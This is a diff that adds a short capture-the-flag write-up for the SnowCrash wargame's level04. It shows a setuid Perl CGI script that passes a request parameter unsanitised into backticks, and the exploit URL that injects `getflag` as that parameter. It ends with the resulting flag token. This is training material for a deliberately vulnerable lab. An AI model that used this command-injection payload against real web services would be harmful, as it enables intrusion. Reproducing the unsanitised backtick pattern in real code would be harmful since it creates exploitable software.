@@ -1,0 +1,33 @@
+level04@SnowCrash:~$ ls -l
+total 4
+-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
+
+(suid and giud set, so we could execute level04 as flag04 instead of level04)
+
+-----------------------------------------------------------------------------------------------------------------------
+
+level04@SnowCrash:~$ cat level04.pl
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+
+-----------------------------------------------------------------------------------------------------------------------
+
+In a browser:
+
+http://10.13.0.100:4747/level04.pl?x=`getflag`
+
+Passing x as param to the CGI
+putting getflag in backquotes, so the echo function will print the return value of the function getflag
+
+-----------------------------------------------------------------------------------------------------------------------
+
+what the browser print:
+
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
